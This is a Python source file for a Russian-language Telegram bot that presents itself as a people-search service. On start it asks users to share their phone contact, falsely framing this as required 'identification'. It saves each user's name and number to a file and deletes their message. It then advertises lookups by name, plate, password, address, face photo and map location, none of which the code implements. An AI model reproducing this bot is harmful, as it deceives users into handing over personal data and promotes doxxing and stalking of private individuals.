import logging
import random
from aiogram import Bot, types
from aiogram.dispatcher import Dispatcher
from aiogram.utils import executor

API_TOKEN = ""

logging.basicConfig(level=logging.INFO)

bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)

@dp.message_handler(commands=['start'])
async def on_start(message: types.Message):
    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
    button = types.KeyboardButton(text="✅ Подтвердить номер телефона", request_contact=True)
    keyboard.add(button)
    
    await message.answer("<b>🗂 Номер телефона\n\n"
                         "Вам необходимо подтвердить номер телефона для того, чтобы завершить идентификацию.\n\n"
                         "Для этого нажмите кнопку ниже.</b>", reply_markup=keyboard, parse_mode="HTML")

@dp.message_handler(content_types=[types.ContentType.CONTACT])
async def on_contact_received(message: types.Message):
    contact = message.contact
    random_filename = f"contact_{random.randint(1000, 9999)}.txt"
    
    with open(random_filename, 'w') as file:
        file.write(f"Contact Name: {contact.first_name}\n"
                   f"Contact Phone Number: {contact.phone_number}")
    
    await message.answer("Вы успешно идентифицированы.", reply_markup=types.ReplyKeyboardRemove())
    
    await bot.delete_message(chat_id=message.chat.id, message_id=message.message_id)
    
    await bot.send_message(chat_id=message.chat.id, text="Вы можете присылать запросы боту таком порядке:\n\n👤 Поиск по имени\n├  `Блогер`\n├  `Проскура Валерий`\n├  `Проскура Валерий Николаевич`\n└  `Устимова Ольга Сергеевна 29.03.1983`\n\n🚗 Поиск по авто\n├  `М999ММ99` - поиск авто по РФ\n├  `ВО4561АХ` - поиск авто по УК\n└  `ХТА21150053965897` - поиск по VIN\n\n👨 Социальные сети\n├  `https://vk.com/id1` - Вконтакте\n├  `https://www.facebook.com/profile.php?id=1` - Facebook\n└  `https://ok.ru/profile/464476975745` - Однокласссники\n\n📱 `79998887777` - для поиска по номеру телефона\n📨 `name@mail.ru` - для поиска по Email\n📧 @slivmenss или перешлите сообщение - поиск по Telegram аккаунту \n\n🔐 `/pas churchill7` - поиск почты, логина и телефона по паролю \n🏚 `/adr Москва, Тверская, д 1, кв 1` - информация по адресу (РФ) \n\n🏛 `/company Сбербанк` - поиск по юр лицам \n📑 `/inn 784806113663` - поиск по ИНН \n\n🌐 `8.8.8.8` или `https://google.com` - информация об IP или домене \n💰 `1AmajNxtJyU7JjAuyiFFkqDaaxuYqkNSkF` - информация о Bitcoin адресе \n\n📸 Отправьте *фото человека*, что бы найти его или двойника в сети Вконтакте. \n🚙 Отправьте *фото номера автомобиля*, что бы получить о нем информацию. \n🌎 Отправьте *точку на карте*, чтобы найти людей которые сейчас там. \n🗣 С помощью *голосовых команд* также можно выполнять *поисковые запросы*.", parse_mode="Markdown")

if __name__ == '__main__':
    from aiogram import executor
    executor.start_polling(dp, skip_updates=True)
